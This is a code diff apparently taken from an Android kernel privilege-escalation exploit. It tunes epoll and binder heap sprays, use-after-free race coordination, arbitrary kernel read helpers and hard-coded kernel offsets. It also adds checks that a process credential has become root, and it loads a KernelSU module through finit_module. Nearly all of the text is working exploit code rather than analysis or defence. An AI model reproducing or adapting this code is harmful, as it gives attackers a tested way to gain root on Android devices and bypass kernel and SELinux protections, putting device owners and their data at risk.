@@ -85,6 +85,7 @@ constexpr int kFragmentCount = 2304;
 constexpr int kNativeFragmentExportCount = 4096;
 constexpr int kEpitemPreDrainCount = 1536;
 constexpr int kEpitemCount = 4096;
+constexpr int kMixedExtraEpitemCount = 8192;
 constexpr int kRawVictimCount = 19;
 constexpr int kRawDecrementCount = 1;
 constexpr int kIsolatedRetirementCount = 64;
@@ -100,9 +101,9 @@ constexpr std::uint64_t kCredSecurityOffset = 120;
 constexpr std::uint64_t kKernelLinkBase = UINT64_C(0xffffffc008000000);
 constexpr char kActionSupervisorPath[] =
         "/data/local/tmp/prism-primitive";
-constexpr off_t kReSukiLoaderSize = 1'301'272;
+constexpr off_t kReSukiLoaderSize = 1'323'008;
 constexpr off_t kReSukiExecutableSize = 4'215'752;
-constexpr off_t kReSukiModuleSize = 119'648;
+constexpr off_t kReSukiModuleSize = 119'712;
 constexpr off_t kReSukiEmbeddedRescueSize = 563'952;
 constexpr std::uint64_t kActionSupervisorReceiptMagic =
         UINT64_C(0x4c50334143545231);
@@ -115,6 +116,7 @@ constexpr std::uint64_t kEventfdFopsOffset = UINT64_C(0x02156800);
 constexpr std::uint64_t kInitCredOffset = UINT64_C(0x027a0ae0);
 constexpr std::uint64_t kInitTaskOffset = UINT64_C(0x0278bec0);
 constexpr std::uint64_t kSelinuxBlobSizesOffset = UINT64_C(0x022e81b8);
+constexpr std::uint64_t kBinderProcsOffset = UINT64_C(0x02a61e90);
 constexpr std::uint64_t kTaskTasksOffset = UINT64_C(0x4c8);
 constexpr std::uint64_t kTaskPidOffset = UINT64_C(0x5c8);
 constexpr std::uint64_t kTaskTgidOffset = UINT64_C(0x5cc);
@@ -158,6 +160,13 @@ std::mutex g_epitem_mutex;
 std::vector<int> g_epitem_fds;
 std::vector<int> g_file_probe_fds;
 std::vector<int> g_file_probe_epoll_fds;
+std::vector<int> g_mixed_epitem_fds;
+std::vector<int> g_mixed_file_probe_fds;
+std::vector<int> g_mixed_file_probe_epoll_fds;
+int g_mixed_predrain_count = 0;
+int g_mixed_pair_count = 0;
+int g_mixed_extra_epitem_count = 0;
+std::vector<std::size_t> g_mixed_binder_window;
 std::atomic<bool> g_terminal_fd_retirement_gate {false};
 std::mutex g_terminal_resource_producer_mutex;
 std::mutex g_owner_fragment_mutex;
@@ -172,6 +181,7 @@ int g_raw_retained_worker = -1;
 bool g_raw_arbitrary_handoff_failed = false;
 bool g_raw_victim0_canonical_original = false;
 int g_raw_arbitrary_rearm_worker = -1;
+std::int64_t g_fake_control_release_microseconds = -1;
 std::atomic<std::uint64_t> g_disclosed_node_address {0};
 std::atomic<std::uint64_t> g_disclosed_file_address {0};
 std::atomic<std::uint64_t> g_disclosed_epitem_address {0};
@@ -185,7 +195,9 @@ std::vector<int> g_fake_node_fds;
 
 constexpr int kFakeControlSprayCount = 512;
 constexpr int kFakeControlInitialSprayCount = 1024;
-constexpr int kFakeControlStagedCount = 32;
+constexpr int kFakeControlStagedCount = 512;
+constexpr int kFakeControlInitialStagedCount = 512;
+constexpr useconds_t kFakeControlPostBoundarySettleUs = 100000;
 constexpr int kFakeControlWriteBatchCount = 4;
 constexpr int kFakeControlWriteBatchGroupSize = kFakeControlSprayCount;
 constexpr int kFakeControlWriteBatchStagedCount =
@@ -296,6 +308,8 @@ int g_selected_epoll_watched_fd = -1;
 int g_arb_file_fd = -1;
 int g_raw_reply_signal_fd = -1;
 std::mutex g_raw_reply_signal_mutex;
+int g_raw_target_boundary_signal_fd = -1;
+std::mutex g_raw_target_boundary_signal_mutex;
 int g_raw_target_handle = -1;
 int g_raw_target_pid = -1;
 std::uint64_t g_raw_target_proc = 0;
@@ -616,6 +630,7 @@ std::uint64_t g_last_binder_probe_init_security = 0;
 std::uint32_t g_last_binder_probe_init_sid = 0;
 std::uint64_t g_last_main_binder_proc = 0;
 std::uint64_t g_last_binder_probe_anchor_proc = 0;
+std::uint64_t g_last_binder_probe_binder_head = 0;
 std::uint64_t g_last_target_binder_proc = 0;
 int g_last_binder_probe_nodes = 0;
 int g_last_binder_probe_marker_offset = -1;
@@ -640,6 +655,7 @@ std::mutex g_raw_isolated_mutex;
 enum class IsolatedRetirementState {
     kIdle,
     kCollecting,
+    kReferencesReleased,
     kRecorded,
     kRetiring,
     kProved,
@@ -665,6 +681,19 @@ struct RawRouteReleaseReceipt {
     bool valid = false;
 };
 RawRouteReleaseReceipt g_raw_route_release_receipt;
+
+bool valid_raw_route_release_profile(
+        int contexts, int handles, int deaths) {
+    return (contexts == 128 && handles == 7360 && deaths == 128) ||
+            (contexts == 128 && handles == 256 && deaths == 0) ||
+            (contexts == 256 && handles == 512 && deaths == 0) ||
+            (contexts == 256 && handles == 264 && deaths == 8) ||
+            (contexts == 256 && handles == 520 && deaths == 8) ||
+            (contexts == 384 && handles == 392 && deaths == 8) ||
+            (contexts == 384 && handles == 776 && deaths == 8) ||
+            (contexts == 512 && handles == 520 && deaths == 8) ||
+            (contexts == 512 && handles == 1032 && deaths == 8);
+}
 int g_raw_controlled_free_pending_victim = -1;
 std::set<int> g_raw_controlled_unlinks;
 std::string g_terminal_cleanup_result;
@@ -729,8 +758,8 @@ IsolatedRetirementSnapshot consume_isolated_retirement_proof() {
                     kIsolatedRetirementCount;
     bool raw_cardinality = g_raw_context_retirement_proved &&
             g_raw_isolated_pids.empty() &&
-            g_raw_isolated_historical_total == 128 &&
-            g_raw_isolated_historical_retired == 128;
+            g_raw_isolated_historical_total == 512 &&
+            g_raw_isolated_historical_retired == 512;
     if (g_raw_isolated_state == IsolatedRetirementState::kProved &&
         (isolated_cardinality || raw_cardinality) &&
         g_raw_isolated_retirement_proved) {
@@ -773,6 +802,9 @@ struct BatchToken {
         return ptr == other.ptr && cookie == other.cookie;
     }
 };
+
+std::mutex g_split_disclosure_mutex;
+std::vector<BatchToken> g_split_disclosure_tokens;
 
 constexpr int kPteCandidates = 32;
 constexpr int kPteMappingsPerCandidate = 512;
@@ -1541,14 +1573,14 @@ OwnerRetirementProof read_owner_retirement_proof(
             read_text_file(
                     directory + "/owner-terminal-retirement.result"),
             {"status", "stage", "nonce", "owner_pid",
-             "owner_start_time", "boot_id", "self_exit"}, &fields);
+             "owner_start_time", "boot_id", "exit_signal"}, &fields);
     bool metadata = parsed && fields["status"] == "pass" &&
             fields["stage"] == "owner-terminal-retirement" &&
             !watchdog.nonce.empty() && fields["nonce"] == watchdog.nonce &&
             !watchdog.boot_id.empty() &&
             fields["boot_id"] == watchdog.boot_id &&
             decimal_digits(fields["owner_start_time"]) &&
-            fields["self_exit"] == "1" &&
+            fields["exit_signal"] == "9" &&
             parse_int_field(fields["owner_pid"], &proof.pid) &&
             proof.pid > 0;
     errno = 0;
@@ -1619,6 +1651,24 @@ bool wait_for_file_byte(const std::string& path, char expected,
     }
     close(fd);
     return matched;
+}
+
+bool wait_for_file_byte_fast(const std::string& path, char expected,
+                             int attempts) {
+    for (int attempt = 0; attempt < attempts; ++attempt) {
+        int fd = open(path.c_str(), O_RDONLY | O_CLOEXEC);
+        if (fd >= 0) {
+            char value = 0;
+            bool matched = pread(fd, &value, 1, 0) == 1 &&
+                    value == expected;
+            close(fd);
+            if (matched) {
+                return true;
+            }
+        }
+        usleep(100);
+    }
+    return false;
 }
 
 bool kernel_pointer(std::uint64_t value) {
@@ -1773,7 +1823,7 @@ void* run_reusable_fake_control_sender(void* argument) {
     auto* slot = static_cast<FakeControlSlot*>(argument);
     slot->tid = static_cast<pid_t>(syscall(SYS_gettid));
     if (slot->tid <= 0 ||
-        prctl(PR_SET_NAME, "lp3-reuse-ctl", 0, 0, 0) != 0) {
+        prctl(PR_SET_NAME, "lp3-fake-ctl", 0, 0, 0) != 0) {
         slot->saved_errno = errno;
         slot->state.store(3, std::memory_order_release);
         return nullptr;
@@ -1914,7 +1964,9 @@ bool drain_reusable_fake_control_slot_locked(FakeControlSlot* slot) {
 }
 
 int release_fake_control_spray_locked() {
+    const auto started = std::chrono::steady_clock::now();
     if (!g_fake_control_active) {
+        g_fake_control_release_microseconds = 0;
         return 0;
     }
     wake_fake_control_staged_waiters_locked();
@@ -1998,6 +2050,9 @@ int release_fake_control_spray_locked() {
         g_fake_control_gate.store(0, std::memory_order_relaxed);
         g_fake_control_staged_gate.store(0, std::memory_order_relaxed);
     }
+    g_fake_control_release_microseconds =
+            std::chrono::duration_cast<std::chrono::microseconds>(
+                    std::chrono::steady_clock::now() - started).count();
     return close_valid ? joined : -1;
 }
 
@@ -2181,6 +2236,7 @@ bool prepare_fake_control_spray(const std::uint8_t* payload,
         g_fake_control_active || payload == nullptr || spray_count <= 0 ||
         spray_count > kFakeControlSlotCount ||
         (!grouped && staged_limit != kFakeControlStagedCount &&
+         staged_limit != kFakeControlInitialStagedCount &&
          staged_limit != kFakeControlReplacementStagedCount)) {
         return false;
     }
@@ -2890,26 +2946,17 @@ bool arbitrary_read32_allow_zero_unchecked(
     return true;
 }
 
-bool arbitrary_read32_allow_zero(
-        std::uint64_t address, std::uint64_t control_address,
-        std::uint64_t expected_control, std::uint32_t* value) {
-    if (!g_arb_read_ready || g_selected_epoll_fd < 0 || value == nullptr ||
-        address < 24 || control_address < 24 || g_arb_file_fd < 0 ||
-        g_selected_epoll_watched_fd < 0 ||
-        !kernel_pointer(expected_control) ||
-        static_cast<std::uint32_t>(expected_control) == 0) {
+bool arbitrary_read64_allow_zero_unchecked(
+        std::uint64_t address, std::uint64_t* value) {
+    std::uint32_t low = 0;
+    std::uint32_t high = 0;
+    if (value == nullptr ||
+        !arbitrary_read32_allow_zero_unchecked(address, &low) ||
+        !arbitrary_read32_allow_zero_unchecked(address + 4, &high)) {
         return false;
     }
-    std::uint64_t before = 0;
-    if (!reliable_read64(control_address, &before) ||
-        before != expected_control) {
-        return false;
-    }
-    bool read = arbitrary_read32_allow_zero_unchecked(address, value);
-    std::uint64_t after = 0;
-    bool control_valid = reliable_read64(control_address, &after) &&
-            after == expected_control;
-    return read && control_valid;
+    *value = low | (static_cast<std::uint64_t>(high) << 32U);
+    return true;
 }
 
 bool reliable_read64_allow_zero(
@@ -2936,7 +2983,7 @@ bool reliable_read64_allow_zero(
     return false;
 }
 
-bool read_credential_snapshot(
+bool read_credential_snapshot_fast(
         std::uint64_t cred, std::uint64_t cred_slot,
         std::uint64_t snapshot[kCredentialSnapshotWords],
         std::uint32_t* sid) {
@@ -2944,16 +2991,25 @@ bool read_credential_snapshot(
         snapshot == nullptr || sid == nullptr) {
         return false;
     }
+    std::uint64_t control = 0;
+    if (!reliable_read64(cred_slot, &control) || control != cred) {
+        return false;
+    }
     for (int index = 0; index < kCredentialSnapshotWords; ++index) {
-        if (!reliable_read64_allow_zero(
+        if (!arbitrary_read64_allow_zero_unchecked(
                     cred + static_cast<std::uint64_t>(index) * 8,
-                    cred_slot, cred, &snapshot[index])) {
+                    &snapshot[index])) {
+            return false;
+        }
+        if (index == kCredentialSnapshotWords / 2 &&
+            (!reliable_read64(cred_slot, &control) || control != cred)) {
             return false;
         }
     }
     std::uint64_t security = snapshot[15];
     return kernel_pointer(security) &&
-            reliable_read32(security + 4, sid);
+            reliable_read32(security + 4, sid) &&
+            reliable_read64(cred_slot, &control) && control == cred;
 }
 
 bool shell_credential_snapshot_valid(
@@ -3108,6 +3164,153 @@ bool validate_zero_root_cred_snapshot(
     g_zero_snapshot_stage = 15;
     *repair_value = repair;
     return true;
+}
+
+bool validate_zero_root_cred_snapshot_fast(
+        std::uint64_t task, std::uint64_t cred,
+        std::uint64_t real_cred_slot, std::uint64_t cred_slot,
+        std::uint64_t expected_security, std::uint32_t expected_sid,
+        std::uint64_t* repair_value) {
+    if (!kernel_pointer(task) || !kernel_pointer(cred) ||
+        !kernel_pointer(expected_security) || expected_sid == 0 ||
+        real_cred_slot < task || real_cred_slot + 16 > task + 0x3000 ||
+        cred_slot != real_cred_slot + 8 || repair_value == nullptr) {
+        return false;
+    }
+    g_zero_snapshot_stage = 1;
+    g_zero_snapshot_header = 0;
+    g_zero_snapshot_id_index = -1;
+    g_zero_snapshot_id_value = 0;
+    g_zero_snapshot_repair = UINT64_MAX;
+    g_zero_snapshot_security = 0;
+    g_zero_snapshot_sid = 0;
+    g_zero_snapshot_final_header = 0;
+    std::uint64_t real_before = 0;
+    std::uint64_t cred_before = 0;
+    std::uint64_t header = 0;
+    std::uint64_t ids[4] {};
+    std::uint64_t repair = UINT64_MAX;
+    std::uint64_t effective_caps = 0;
+    std::uint64_t security = 0;
+    std::uint32_t sid = 0;
+    std::uint64_t middle_cred = 0;
+    std::uint64_t real_after = 0;
+    std::uint64_t cred_after = 0;
+    std::uint64_t final_header = 0;
+    if (!reliable_read64(real_cred_slot, &real_before) ||
+        real_before != cred) {
+        return false;
+    }
+    g_zero_snapshot_stage = 2;
+    if (!reliable_read64(cred_slot, &cred_before) ||
+        cred_before != cred) {
+        return false;
+    }
+    g_zero_snapshot_stage = 3;
+    if (!arbitrary_read64_allow_zero_unchecked(cred, &header)) {
+        return false;
+    }
+    g_zero_snapshot_header = header;
+    std::uint32_t usage = static_cast<std::uint32_t>(header);
+    std::uint32_t uid = static_cast<std::uint32_t>(header >> 32U);
+    g_zero_snapshot_stage = 4;
+    if (usage < 16 || usage > 4096 || uid != 0) {
+        return false;
+    }
+    for (int index = 0; index < 4; ++index) {
+        g_zero_snapshot_stage = 5 + index;
+        g_zero_snapshot_id_index = index;
+        if (!arbitrary_read64_allow_zero_unchecked(
+                    cred + 4 + index * 8, &ids[index])) {
+            return false;
+        }
+        g_zero_snapshot_id_value = ids[index];
+        if (ids[index] != 0) {
+            return false;
+        }
+    }
+    g_zero_snapshot_stage = 9;
+    if (!arbitrary_read64_allow_zero_unchecked(cred + 8, &repair)) {
+        return false;
+    }
+    g_zero_snapshot_repair = repair;
+    if (repair != 0) {
+        return false;
+    }
+    if (!reliable_read64(cred_slot, &middle_cred) ||
+        middle_cred != cred) {
+        return false;
+    }
+    g_zero_snapshot_stage = 10;
+    if (!arbitrary_read64_allow_zero_unchecked(
+                cred + 56, &effective_caps) ||
+        effective_caps == 0 ||
+        effective_caps != g_security_target_cred_caps) {
+        return false;
+    }
+    if (!reliable_read64(cred + kCredSecurityOffset, &security)) {
+        return false;
+    }
+    g_zero_snapshot_security = security;
+    if (security != expected_security) {
+        return false;
+    }
+    g_zero_snapshot_stage = 11;
+    if (!reliable_read32(security + 4, &sid)) {
+        return false;
+    }
+    g_zero_snapshot_sid = sid;
+    if (sid != expected_sid) {
+        return false;
+    }
+    g_zero_snapshot_stage = 12;
+    if (!reliable_read64(real_cred_slot, &real_after) ||
+        real_after != cred) {
+        return false;
+    }
+    g_zero_snapshot_stage = 13;
+    if (!reliable_read64(cred_slot, &cred_after) ||
+        cred_after != cred) {
+        return false;
+    }
+    g_zero_snapshot_stage = 14;
+    if (!arbitrary_read64_allow_zero_unchecked(cred, &final_header)) {
+        return false;
+    }
+    g_zero_snapshot_final_header = final_header;
+    if (final_header != header) {
+        return false;
+    }
+    g_zero_snapshot_stage = 15;
+    *repair_value = repair;
+    return true;
+}
+
+bool validate_zero_identity_fields_fast(
+        std::uint64_t cred, std::uint64_t cred_slot,
+        std::uint32_t expected_usage) {
+    std::uint64_t control_before = 0;
+    std::uint64_t header = 0;
+    std::uint32_t sgid = UINT32_MAX;
+    std::uint64_t effective_ids = UINT64_MAX;
+    std::uint64_t fs_ids = UINT64_MAX;
+    std::uint64_t control_after = 0;
+    std::uint64_t final_header = 0;
+    return reliable_read64(cred_slot, &control_before) &&
+            control_before == cred &&
+            arbitrary_read64_allow_zero_unchecked(cred, &header) &&
+            static_cast<std::uint32_t>(header) == expected_usage &&
+            static_cast<std::uint32_t>(header >> 32U) == 0 &&
+            arbitrary_read32_allow_zero_unchecked(
+                    cred + 16, &sgid) && sgid == 0 &&
+            arbitrary_read64_allow_zero_unchecked(
+                    cred + 20, &effective_ids) && effective_ids == 0 &&
+            arbitrary_read64_allow_zero_unchecked(
+                    cred + 28, &fs_ids) && fs_ids == 0 &&
+            reliable_read64(cred_slot, &control_after) &&
+            control_after == cred &&
+            arbitrary_read64_allow_zero_unchecked(
+                    cred, &final_header) && final_header == header;
 }
 
 bool validate_live_security_target(bool cached_proc_only = false) {
@@ -3288,6 +3491,8 @@ bool derive_kernel_profile(std::uint64_t task, std::uint64_t* slide,
     return false;
 }
 
+std::uint64_t find_target_binder_proc(std::uint64_t proc, int handle);
+
 std::uint64_t find_current_binder_proc() {
     g_last_binder_probe_file = 0;
     g_last_binder_probe_fops = 0;
@@ -3301,6 +3506,7 @@ std::uint64_t find_current_binder_proc() {
     g_last_binder_probe_init_sid = 0;
     g_last_main_binder_proc = 0;
     g_last_binder_probe_anchor_proc = 0;
+    g_last_binder_probe_binder_head = 0;
     g_last_binder_probe_nodes = 0;
     g_last_binder_probe_marker_offset = -1;
     g_last_binder_probe_stage = 1;
@@ -3452,7 +3658,20 @@ std::uint64_t find_current_binder_proc() {
     // only older processes. This avoids racing short-lived clients at the
     // live global head.
     std::uint64_t cursor = 0;
+    std::uint64_t binder_head_address =
+            runtime_base + kBinderProcsOffset;
+    if (derived && kernel_address(binder_head_address) &&
+        reliable_read64(binder_head_address, &cursor) &&
+        kernel_pointer(cursor)) {
+        g_last_binder_probe_binder_head = cursor;
+        g_last_binder_probe_anchor_proc = cursor;
+    } else {
+        cursor = 0;
+    }
     for (std::uint64_t node : candidates) {
+        if (kernel_pointer(cursor)) {
+            break;
+        }
         std::uint64_t proc = 0;
         std::uint32_t pid = 0;
         std::uint64_t task = 0;
@@ -3476,19 +3695,36 @@ std::uint64_t find_current_binder_proc() {
     while (kernel_pointer(cursor) && visited.insert(cursor).second &&
            visited.size() <= 4096) {
         std::uint32_t pid = 0;
-        std::uint64_t task = 0;
-        std::uint64_t refs = 0;
         std::uint64_t next = 0;
-        bool valid = arbitrary_read32(cursor + 64, &pid) &&
-                reliable_read64(cursor + 72, &task) &&
-                kernel_pointer(task) &&
-                reliable_read64(cursor + 32, &refs) &&
-                (refs == 0 || kernel_pointer(refs));
-        if (valid && pid == static_cast<std::uint32_t>(getpid())) {
-            g_last_main_binder_proc = cursor;
-            g_last_binder_probe_marker_offset = 0;
-            g_last_binder_probe_stage = 6;
-            return cursor;
+        bool header_valid = arbitrary_read32(cursor + 64, &pid);
+        if (header_valid && pid == static_cast<std::uint32_t>(getpid())) {
+            bool target_bound = g_credential_target_handle > 0 &&
+                    g_credential_target_pid > 0;
+            std::uint64_t target_proc = target_bound
+                    ? find_target_binder_proc(
+                            cursor, g_credential_target_handle)
+                    : 0;
+            std::uint32_t target_pid = 0;
+            bool target_matches = !target_bound ||
+                    (kernel_pointer(target_proc) &&
+                     arbitrary_read32(target_proc + 64, &target_pid) &&
+                     target_pid == static_cast<std::uint32_t>(
+                             g_credential_target_pid));
+            if (target_matches) {
+                std::uint64_t task = 0;
+                std::uint64_t refs = 0;
+                bool structure_valid =
+                        reliable_read64(cursor + 72, &task) &&
+                        kernel_pointer(task) &&
+                        reliable_read64(cursor + 32, &refs) &&
+                        (refs == 0 || kernel_pointer(refs));
+                if (structure_valid) {
+                    g_last_main_binder_proc = cursor;
+                    g_last_binder_probe_marker_offset = 0;
+                    g_last_binder_probe_stage = 6;
+                    return cursor;
+                }
+            }
         }
         if (!reliable_read64(cursor, &next)) {
             break;
@@ -3511,11 +3747,12 @@ Java_com_vandam_prism_NativeBridge_probeCurrentBinderProc(
             "status=%s stage=current-binder-proc"
             " proc=0x%" PRIx64 " probe_stage=%d nodes=%d"
             " anchor_proc=0x%" PRIx64 " fops=0x%" PRIx64
-            " kernel_base=0x%" PRIx64,
+            " kernel_base=0x%" PRIx64 " binder_head=0x%" PRIx64,
             pass ? "pass" : "miss", current_proc,
             g_last_binder_probe_stage, g_last_binder_probe_nodes,
             g_last_binder_probe_anchor_proc, g_last_binder_probe_fops,
-            g_last_binder_probe_base);
+            g_last_binder_probe_base,
+            g_last_binder_probe_binder_head);
     return environment->NewStringUTF(state);
 }
 
@@ -3526,6 +3763,37 @@ std::uint64_t find_target_binder_proc(std::uint64_t proc, int handle) {
     if (!kernel_pointer(proc) || handle <= 0 ||
         !reliable_read64(proc + 32, &root) || !kernel_pointer(root)) {
         return 0;
+    }
+    std::uint64_t cursor = root;
+    std::set<std::uint64_t> ordered_visited;
+    while (kernel_pointer(cursor) && ordered_visited.size() < 64 &&
+           ordered_visited.insert(cursor).second && cursor >= 16) {
+        ++g_last_binder_ref_nodes;
+        std::uint64_t ref = cursor - 16;
+        std::uint32_t desc = 0;
+        if (!reliable_read32(ref + 4, &desc)) {
+            break;
+        }
+        if (desc == static_cast<std::uint32_t>(handle)) {
+            std::uint64_t node = 0;
+            std::uint64_t target_proc = 0;
+            if (reliable_read64(ref + 88, &node) &&
+                kernel_pointer(node) &&
+                reliable_read64(node + 56, &target_proc) &&
+                kernel_pointer(target_proc)) {
+                g_last_target_binder_proc = target_proc;
+                return target_proc;
+            }
+            break;
+        }
+        std::uint64_t next = 0;
+        std::uint64_t child_offset =
+                static_cast<std::uint32_t>(handle) < desc ? 16 : 8;
+        if (!reliable_read64(cursor + child_offset, &next) ||
+            (next != 0 && !kernel_pointer(next))) {
+            break;
+        }
+        cursor = next;
     }
     std::vector<std::uint64_t> pending {root};
     std::set<std::uint64_t> visited;
@@ -4454,6 +4722,12 @@ struct SplitDecrementContext {
     bool retirement_before_go = false;
     bool retirement_after_write = false;
     bool generation_valid = false;
+    bool gates_prepared = false;
+    bool target_read_ready = false;
+    bool read_go = false;
+    bool boundary_signal = false;
+    bool victim_work_ready = false;
+    bool read_continue = false;
 };
 
 std::mutex g_split_decrement_quarantine_mutex;
@@ -4511,9 +4785,9 @@ bool split_decrement_generation_current_locked(
         g_fake_control_generation != context.generation ||
         g_fake_control_expected != context.expected ||
         g_fake_control_expected != kFakeControlInitialSprayCount ||
-        g_fake_control_staged_limit != kFakeControlStagedCount ||
+        g_fake_control_staged_limit != kFakeControlInitialStagedCount ||
         g_fake_control_staged_expected != context.staged_expected ||
-        context.staged_expected != kFakeControlStagedCount ||
+        context.staged_expected != kFakeControlInitialStagedCount ||
         g_fake_control_staged_generation != context.staged_generation ||
         (check_retirement &&
          g_terminal_fd_retirement_gate.load(std::memory_order_acquire))) {
@@ -4524,7 +4798,7 @@ bool split_decrement_generation_current_locked(
         active_staged += fake_control_slot_active_staged(slot) ? 1 : 0;
     }
     return active_staged == context.staged_active &&
-            active_staged == kFakeControlStagedCount;
+            active_staged == kFakeControlInitialStagedCount;
 }
 
 bool capture_split_decrement_generation_locked(
@@ -4813,7 +5087,25 @@ bool join_split_decrement_thread(SplitDecrementContext* context,
     return finished && context->thread_joined;
 }
 
-bool activate_split_decrement_spray(SplitDecrementContext* context) {
+bool wait_raw_target_boundary_signal() {
+    std::lock_guard<std::mutex> lock(g_raw_target_boundary_signal_mutex);
+    int fd = g_raw_target_boundary_signal_fd;
+    if (fd < 0) {
+        return false;
+    }
+    pollfd descriptor {fd, POLLIN, 0};
+    int poll_result = poll(&descriptor, 1, 500);
+    std::uint64_t value = 0;
+    bool pass = poll_result == 1 &&
+            (descriptor.revents & POLLIN) != 0 &&
+            read(fd, &value, sizeof(value)) == sizeof(value) && value == 1;
+    close(fd);
+    g_raw_target_boundary_signal_fd = -1;
+    return pass;
+}
+
+bool activate_split_decrement_spray(SplitDecrementContext* context,
+                                    const std::string& directory) {
     if (context == nullptr || context->coordinator_cpu != 1 ||
         !wait_split_decrement_phase(*context,
                 kSplitDecrementPhaseReady, kSplitDecrementWaitMs)) {
@@ -4867,7 +5159,7 @@ bool activate_split_decrement_spray(SplitDecrementContext* context) {
         if (state.second) {
             break;
         }
-        if (state.first == kFakeControlStagedCount) {
+        if (state.first == kFakeControlInitialStagedCount) {
             context->staged_state2 = state.first;
             staged_entered = true;
             break;
@@ -4881,8 +5173,46 @@ bool activate_split_decrement_spray(SplitDecrementContext* context) {
     auto stable_state = state_snapshot(true);
     context->staged_state2 = stable_state.first;
     context->staged_stable = !stable_state.second &&
-            stable_state.first == kFakeControlStagedCount;
+            stable_state.first == kFakeControlInitialStagedCount;
     if (!context->staged_stable) {
+        return false;
+    }
+
+    release_split_decrement_thread(context);
+    if (!wait_split_decrement_phase(*context,
+                kSplitDecrementPhaseReadDone, kSplitDecrementWaitMs) ||
+        !context->exact_read || context->read_tid != context->tid) {
+        return false;
+    }
+
+    const std::string free_gate =
+            directory + "/controlled-free.enable.0";
+    const std::string read_gate =
+            directory + "/controlled-read.enable.0";
+    const std::string target_ready =
+            directory + "/raw-target.reading.0";
+    const std::string read_go =
+            directory + "/controlled-read.go.0";
+    const std::string victim_work =
+            directory + "/raw-target.victim-work.0";
+    const std::string read_continue =
+            directory + "/controlled-read.continue.0";
+    context->gates_prepared = write_text_file(free_gate, "0") &&
+            write_text_file(read_gate,
+                    "status=pass stage=arb-read-enable victim=0");
+    if (!context->gates_prepared ||
+        !wait_for_file(target_ready, 500) ||
+        read_text_file(target_ready) !=
+                "status=ready polling=1 timeout_ms=20000") {
+        return false;
+    }
+    context->target_read_ready = true;
+    context->read_go = write_text_file(read_go, "1");
+    if (!context->read_go) {
+        return false;
+    }
+    context->boundary_signal = wait_raw_target_boundary_signal();
+    if (!context->boundary_signal) {
         return false;
     }
     {
@@ -4896,6 +5226,29 @@ bool activate_split_decrement_spray(SplitDecrementContext* context) {
         syscall(SYS_futex, &g_fake_control_gate, FUTEX_WAKE_PRIVATE,
                 INT_MAX, nullptr, nullptr, 0);
         context->global_published = true;
+    }
+    std::map<std::string, std::string> victim_fields;
+    context->victim_work_ready = wait_for_file(victim_work, 500) &&
+            parse_ordered_record(read_text_file(victim_work),
+                    {"status", "stage", "read_calls", "responses",
+                     "victim_released", "early_reclaim", "signal",
+                     "worker",
+                     "cpu_before", "cpu_after"}, &victim_fields) &&
+            victim_fields["status"] == "ready" &&
+            victim_fields["stage"] == "victim-work-drained" &&
+            victim_fields["read_calls"] == "1" &&
+            victim_fields["responses"] == "5" &&
+            victim_fields["signal"] == "1" &&
+            ((victim_fields["victim_released"] == "1" &&
+              victim_fields["early_reclaim"] == "0" &&
+              victim_fields["worker"] == "-1") ||
+             (victim_fields["victim_released"] == "0" &&
+              victim_fields["early_reclaim"] == "1" &&
+              decimal_digits(victim_fields["worker"]))) &&
+            victim_fields["cpu_before"] == "2" &&
+            victim_fields["cpu_after"] == "1";
+    if (!context->victim_work_ready) {
+        return false;
     }
     bool all_entered = false;
     for (int attempt = 0; attempt < 2000; ++attempt) {
@@ -4922,7 +5275,7 @@ bool activate_split_decrement_spray(SplitDecrementContext* context) {
     if (!all_entered) {
         return false;
     }
-    usleep(200000);
+    usleep(kFakeControlPostBoundarySettleUs);
     auto final_state = state_snapshot(false);
     context->blocked = final_state.first;
     context->retirement_after_write =
@@ -4931,16 +5284,15 @@ bool activate_split_decrement_spray(SplitDecrementContext* context) {
         final_state.first != context->expected) {
         return false;
     }
+    context->read_continue = write_text_file(read_continue, "1");
+    if (!context->read_continue) {
+        return false;
+    }
     {
         std::lock_guard<std::mutex> lock(g_fake_control_mutex);
         if (!split_decrement_generation_current_locked(*context, true)) {
             return false;
         }
-    }
-    release_split_decrement_thread(context);
-    if (!wait_split_decrement_phase(*context,
-                kSplitDecrementPhaseReadDone, kSplitDecrementWaitMs)) {
-        return false;
     }
     return context->exact_read && context->read_tid == context->tid;
 }
@@ -6377,15 +6729,20 @@ pid_t spawn_resukisu_pidfd_supervisor(
                 O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC | O_NOFOLLOW,
                 0600);
         auto record_phase = [&](const char* stage, int result, int error) {
-            char line[128];
+            timespec now {};
+            (void)clock_gettime(CLOCK_MONOTONIC, &now);
+            char line[160];
             int length = std::snprintf(
-                    line, sizeof(line), "%s result=%d errno=%d\n",
+                    line, sizeof(line),
+                    "LP3_ACTION_PHASE elapsed_ns=%lld stage=%s result=%d errno=%d\n",
+                    static_cast<long long>(now.tv_sec) * 1000000000LL +
+                            now.tv_nsec,
                     stage, result, error);
             if (length > 0 && length < static_cast<int>(sizeof(line))) {
                 if (phase_fd >= 0) {
                     (void)syscall(SYS_write, phase_fd, line, length);
-                    (void)fsync(phase_fd);
                 }
+                (void)syscall(SYS_write, STDERR_FILENO, line, length);
                 int completion_phase_fd =
                         g_resukisu_completion_fd.load(
                                 std::memory_order_relaxed);
@@ -6394,7 +6751,6 @@ pid_t spawn_resukisu_pidfd_supervisor(
                             static_cast<std::size_t>(length), 47);
                     (void)pwrite(
                             completion_phase_fd, line, phase_length, 16);
-                    (void)fsync(completion_phase_fd);
                 }
             }
         };
@@ -6563,9 +6919,20 @@ pid_t spawn_resukisu_pidfd_supervisor(
             (void)syscall(SYS_exit, 78);
             __builtin_unreachable();
         }
+        char kernelsu_parameters[48];
+        int kernelsu_parameter_length = std::snprintf(
+                kernelsu_parameters, sizeof(kernelsu_parameters),
+                "lp3_manager_uid=%d", manager_uid);
+        if (kernelsu_parameter_length <= 0 ||
+                kernelsu_parameter_length >=
+                        static_cast<int>(sizeof(kernelsu_parameters))) {
+            (void)close(kernelsu_fd);
+            (void)syscall(SYS_exit, 85);
+            __builtin_unreachable();
+        }
         errno = 0;
         int kernelsu_result = static_cast<int>(syscall(
-                SYS_finit_module, kernelsu_fd, "", 0));
+                SYS_finit_module, kernelsu_fd, kernelsu_parameters, 0));
         int kernelsu_error = kernelsu_result == 0 ? 0 : errno;
         (void)close(kernelsu_fd);
         record_phase("kernelsu-init", kernelsu_result, kernelsu_error);
@@ -6763,8 +7130,9 @@ void* command_root_watchdog_thread(void*) {
             break;
         }
         int action = g_resukisu_action.load(std::memory_order_acquire);
-        if (action == 2 && g_action_loader_request.load(
-                    std::memory_order_acquire) == 1) {
